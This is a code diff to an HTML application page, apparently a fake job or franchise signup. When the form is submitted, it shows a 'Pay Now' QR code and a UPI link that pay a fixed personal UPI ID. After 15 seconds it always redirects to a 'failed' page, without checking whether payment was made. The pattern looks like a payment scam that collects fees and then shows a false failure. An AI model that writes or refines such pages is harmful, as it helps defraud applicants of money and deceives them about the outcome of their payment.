@@ -183,22 +183,21 @@
       </div>
     </div>
 
-    <!-- Loading Modal (After Apply) -->
-    <div class="modal fade" id="loadingModal" tabindex="-1" aria-labelledby="loadingModalLabel" aria-hidden="true">
-      <div class="modal-dialog">
-        <div class="modal-content text-center">
-          <div class="modal-header">
-            <h5 class="modal-title" id="loadingModalLabel">Processing Your Application</h5>
-          </div>
-          <div class="modal-body">
-            <img id="qrCodeImage" src="" class="img-container" alt="QR Code">
-            <p>Pay Now</p>
-          </div>
-        </div>
+<!-- Loading Modal (After Apply) -->
+<div class="modal fade" id="loadingModal" tabindex="-1" aria-labelledby="loadingModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+    <div class="modal-content text-center">
+      <div class="modal-header">
+        <h5 class="modal-title" id="loadingModalLabel">Processing Your Application</h5>
+      </div>
+      <div class="modal-body">
+        <img id="qrCodeImage" src="" class="img-container" alt="QR Code">
+        <p>Pay Now</p>
+        <a id="qrPaymentButton" href="#" target="_blank" class="btn btn-pink mt-3">Pay via UPI</a>
       </div>
     </div>
-
   </div>
+</div>
 
   <div class="container mt-5">
   <!-- Company Information Section -->
@@ -354,27 +353,26 @@
       loginForm.style.display = loginForm.style.display === 'none' ? 'block' : 'none';
     }
 
-    // Handle apply button click
-    document.getElementById('applyForm').addEventListener('submit', function(event) {
-      event.preventDefault();
+// Handle apply button click
+document.getElementById('applyForm').addEventListener('submit', function(event) {
+  event.preventDefault();
 
-      // Generate QR Code
-      const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=kumar1769685@slc&am=&pn=Mr%20FLP%20%20India&mc=0000&mode=02&purpose=00`;
-      document.getElementById('qrCodeImage').src = qrCodeUrl;
+  // UPI Payment URL
+  const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=kumar1769685@slc&pn=Mr%20FLP%20%20India&mc=0000&mode=02&purpose=00`;
+  const upiPaymentUrl = `upi://pay?pa=kumar1769685@slc&pn=Mr%20FLP%20%20India&mc=0000&mode=02&purpose=00`;
 
-      // Show the loading modal
-      const loadingModal = new bootstrap.Modal(document.getElementById('loadingModal'));
-      loadingModal.show();
+  document.getElementById('qrCodeImage').src = qrCodeUrl;
+  document.getElementById('qrPaymentButton').href = upiPaymentUrl;
 
-      // Simulate 5 seconds loading before showing the processing modal
-      setTimeout(() => {
-        // After 5 seconds, show the loading modal
-        setTimeout(() => {
-          // Redirect to payment failed page after 15 seconds
-          window.location.href = "failed.html";  // Redirect after 15 seconds
-        }, 15000); // Wait for 15 seconds before redirecting
-      }, 5000); // Loading for 5 seconds
-    });
+  // Show the loading modal
+  const loadingModal = new bootstrap.Modal(document.getElementById('loadingModal'));
+  loadingModal.show();
+
+  // Redirect to failed page after 15 seconds
+  setTimeout(() => {
+    window.location.href = "failed.html";
+  }, 15000);
+});
 
       // Performance chart code
   const ctx = document.getElementById('performanceChart').getContext('2d');
